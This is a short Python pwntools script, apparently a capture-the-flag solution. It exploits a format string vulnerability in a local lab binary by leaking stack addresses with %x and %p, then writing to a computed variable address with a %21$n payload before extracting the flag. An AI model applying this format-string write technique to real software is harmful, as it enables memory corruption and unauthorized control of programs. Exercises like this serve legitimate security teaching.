#!/usr/bin/env python3
from pwn import *
import re

context.log_level = 'error'

# Run process
io = process("./main.elf")

# Username
io.sendline(b'%x' * 8)

# Skip useless output
for i in range(5):
    io.recvline()

# Pointer address + calculate Impressed address
io.sendline(b'%x.' * 6 + b'%p')
pointerAdr = io.recvline().decode('ascii').split('.')[6].strip()
impressedAdr = p64(int(pointerAdr, 16) - 12)

# HackZ
io.sendline(b'a' * 19 + b'%21$n' + impressedAdr)
io.sendline(b'a')
io.sendline(b'a')
io.sendline(b'a')

# Do the flag reading thingy with REEEEEEEEEEE (Regular Expression stolen from professor MartinSchwarzl, all credits go to him)
r = io.recvall().decode('ascii', errors='ignore')
flag_regex = re.compile('(InfoSec{.+[^}]})')
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)